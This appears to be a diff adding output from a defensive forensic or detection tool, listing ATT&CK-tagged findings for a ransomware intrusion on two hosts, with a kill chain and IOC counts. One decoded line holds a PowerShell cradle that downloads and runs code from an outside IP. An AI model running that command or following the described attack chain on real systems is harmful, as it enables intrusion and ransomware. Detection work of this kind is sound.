@@ -1,0 +1,32 @@
+[✓] integrity WS-0102: verified
+[✓] integrity FS01: verified
+[+] 305 events, 26 findings {'high': 10, 'medium': 4, 'critical': 12}
+    14:25:00 WS-0102  Initial Access       T1553.005  Disk image (ISO/IMG/VHD) written by browser or mail client
+    14:26:35 WS-0102  Execution            T1218.005  mshta.exe executing HTA / script
+    14:26:41 WS-0102  Execution            T1059.001  Encoded / hidden PowerShell
+             ↳ decoded: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a')
+    14:26:50 WS-0102  Execution            T1105      Executable/DLL dropped in user-writable path
+    14:26:55 WS-0102  Defense Evasion      T1218.011  rundll32 loading a DLL from a user-writable path
+    14:26:58 WS-0102  Command and Control  T1071.001  C2 beaconing every ~60.1s (30 connections, jitter 0.04)
+    14:27:20 WS-0102  Persistence          T1053.005  Scheduled task created (command line)
+    14:27:21 WS-0102  Persistence          T1053.005  Scheduled task registered (Event 4698)
+    14:35:00 WS-0102  Discovery            T1087.002  Domain / privileged-group discovery commands
+    14:50:00 WS-0102  Credential Access    T1003.001  LSASS memory dump (comsvcs MiniDump / procdump)
+    14:50:00 WS-0102  Credential Access    T1003.001  Process opened LSASS with full access (Sysmon 10)
+    14:51:40 WS-0102  Defense Evasion      T1562.001  Microsoft Defender protection disabled
+    15:25:00 WS-0102  Lateral Movement     T1569.002  PsExec remote execution
+    15:25:02 FS01     Lateral Movement     T1021.002  Network logon (type 3) from a workstation to a server
+    15:25:03 FS01     Persistence          T1543.003  New service installed (Event 7045)
+    15:25:03 FS01     Lateral Movement     T1569.002  PsExec remote execution
+    15:25:04 FS01     Execution            T1569.002  Process executed from Windows\Temp by a service (SYSTEM)
+    15:25:06 FS01     Impact               T1490      Shadow copies / backup catalog deleted, recovery disabled
+    15:25:07 FS01     Impact               T1490      Shadow copies / backup catalog deleted, recovery disabled
+    15:25:08 FS01     Impact               T1490      Shadow copies / backup catalog deleted, recovery disabled
+    15:25:10 FS01     Impact               T1486      Mass encryption: 250 files renamed to *.lockd
+    15:30:00 FS01     Impact               T1486      Ransom note dropped
+    15:30:50 FS01     Defense Evasion      T1070.001  Event log cleared
+    15:30:51 FS01     Defense Evasion      T1070.001  Event log cleared
+    20:10:00 WS-0102  Persistence          T1053.005  Live scheduled task runs from user-writable path (\MicrosoftEdgeUpdate
+    20:10:00 WS-0102  Command and Control  T1071      Active connection to internet from suspicious process at collection ti
+[+] Kill chain: Initial Access → Execution → Persistence → Defense Evasion → Credential Access → Discovery → Lateral Movement → Command and Control → Impact
+[+] IOCs: path=4, ipv4=1, url=1, scheduled_task=1, sha256=2, service=1
